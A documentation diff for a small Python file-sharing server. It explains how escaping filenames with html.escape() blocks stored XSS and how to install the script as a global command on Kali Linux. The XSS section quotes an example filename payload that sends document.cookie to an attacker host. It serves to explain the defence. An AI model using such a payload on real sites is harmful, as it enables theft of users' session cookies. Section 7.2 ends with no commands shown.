@@ -262,6 +262,49 @@ The server then evaluates the path prefix rule:
          python
      target_norm.startswith(base_norm)
 This check verifies that the resolved target path still begins with the official BASE_DIR string boundary. If an input attempts to step outside this boundary, the script halts processing, prints a critical warning alert to your terminal console, and returns an HTTP 403 Forbidden error.
+### 6.3 Stored Cross-Site Scripting (XSS) Defenses via Escaping Matrices
+
+If an application renders filenames blindly inside a template, it leaves a major security gap open for Stored Cross-Site Scripting (XSS) attacks. An attacker could upload a file maliciously named with JavaScript tags, such as:
+
+     text
+    <script>fetch('https://attacker.com' + document.cookie)</script>.png
+  If the server lists this filename raw, other client browsers will compile and execute the code. Since the server uses high-value cookies for authentication, this script could steal active session tokens directly from the browser.
+
+  The application neutralizes this threat by importing and wrapping directory elements in Python's native html.escape() filter:
+
+         python
+     safe_item_name = escape(item)
+This function intercepts filename strings and translates special characters into safe, inert HTML entities:
+
+     • < becomes &lt;
+     • > becomes &gt;
+     • & becomes &amp;
+When the phone browser loads the file index dashboard, it treats the escaped string purely as harmless text metadata instead of executable code, completely blocking Cross-Site Scripting exploits.
+# 7: SYSTEM INTEGRATION & LINUX DEPLOYMENT BLUEPRINT
+### 7.1 Linux Filesystem Hierarchy Standard (FHS) Mapping
+
+To transform your standalone app.py script into a native, globally accessible system utility like nmap or wireshark, the application is configured to align with the standard Linux Filesystem Hierarchy Standard (FHS).
+
+The FHS defines /usr/local/bin/ as the official directory for custom, user-installed system commands and tools that sit outside the core OS packages.
+
+     [ app.py Source ] ──► Inject Interpreter Shebang ──► Move to /usr/local/bin/ ──► Set Permissions (chmod +x)
+                                                                                       │
+                                                                                       ▼
+                                                                           [ Global Terminal Tool: airshare ]
+By adding a standard Linux interpreter directive (shebang line) as the very first line of your script, you tell the operating system kernel exactly how to run the file:
+      
+          python
+          #!/usr/bin/env python3
+ When you launch the file, the Linux program loader reads this directive and automatically passes the script contents straight to your system's Python 3 environment, removing the need to type python3 manually before the file name.
+
+ ### 7.2 Script Modernization, Global Environment Execution, and Initialization
+
+ To complete the system integration on your Kali Linux machine, execute this setup sequence in your terminal to move the script into your system's binary folder:
+
+
+
+
+
 
 
 
